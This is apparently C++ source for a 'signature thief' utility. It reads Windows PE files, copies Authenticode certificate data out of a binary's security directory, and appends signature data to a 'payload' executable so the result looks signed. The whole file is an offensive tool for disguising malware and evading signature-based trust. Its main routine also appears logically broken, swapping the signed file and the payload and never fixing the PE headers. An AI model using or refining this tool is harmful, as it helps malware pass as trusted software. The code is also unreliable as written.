#include "signature_thief.hpp"

#include <iostream>
#include <fstream>
#include <stdexcept>
#include <Windows.h>
#include <string>

mapped_file_t Signature_Thief::map_binary_to_memory(std::string_view filename) {
    std::ifstream file(filename.data(), std::ios::binary | std::ios::ate);

    if (!file.is_open()) {
        throw std::runtime_error("Error opening file: " + std::string(filename));
    }

    const uint64_t size = file.tellg();
    file.seekg(0, std::ios::beg);

    mapped_file_t::byte_array_t buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);

    return { std::move(buffer), size };
}


mapped_file_t Signature_Thief::rip_cert(std::string_view file_location) {
    mapped_file_t signed_pe_data = map_binary_to_memory(file_location);

    const auto* dos_header = reinterpret_cast<const PIMAGE_DOS_HEADER>(signed_pe_data.binary.data());
    const auto* nt_headers = reinterpret_cast<const PIMAGE_NT_HEADERS>(signed_pe_data.binary.data() + dos_header->e_lfanew);

    const auto& cert_info = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];

    const auto pe_binary_begin = signed_pe_data.binary.begin() + cert_info.VirtualAddress;
    const auto pe_binary_end = pe_binary_begin + cert_info.Size;

    mapped_file_t::byte_array_t cert_data(pe_binary_begin, pe_binary_end);
    return { cert_data, cert_info.Size };
}

void Signature_Thief::append_signature_to_payload(std::string_view signature_file, mapped_file_t& payload) {
    try {
        mapped_file_t signature_data = map_binary_to_memory(signature_file);

        payload.binary.insert(payload.binary.end(), signature_data.binary.begin(), signature_data.binary.end());
        payload.size += signature_data.size;
    }
    catch (const std::exception& e) {
        throw std::runtime_error("Error appending signature to payload: " + std::string(e.what()));
    }
}

int main(int argc, char** argv) {
    try {
        Signature_Thief signature_thief;

        std::string signedPePathStr, payloadPathStr, outputPathStr;

        if (argc >= 4) {
            signedPePathStr = argv[1];
            payloadPathStr = argv[2];
            outputPathStr = argv[3];
        }
        else {
            std::cout << "Enter the path to the signed file: ";
            std::getline(std::cin, signedPePathStr);

            std::cout << "Enter the path to the payload file: ";
            std::getline(std::cin, payloadPathStr);

            std::cout << "Enter the output path: ";
            std::getline(std::cin, outputPathStr);
        }

        mapped_file_t payload = signature_thief.rip_cert(payloadPathStr);
        signature_thief.append_signature_to_payload(signedPePathStr, payload);

        std::ofstream outputFile(outputPathStr.data(), std::ios::binary);
        if (!outputFile.is_open()) {
            throw std::runtime_error("Error opening output file: " + std::string(outputPathStr));
        }
        outputFile.write(reinterpret_cast<const char*>(payload.binary.data()), payload.size);
        outputFile.close();

        std::cout << "Signature appended successfully." << std::endl;
        return EXIT_SUCCESS;
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return EXIT_FAILURE;
    }
}
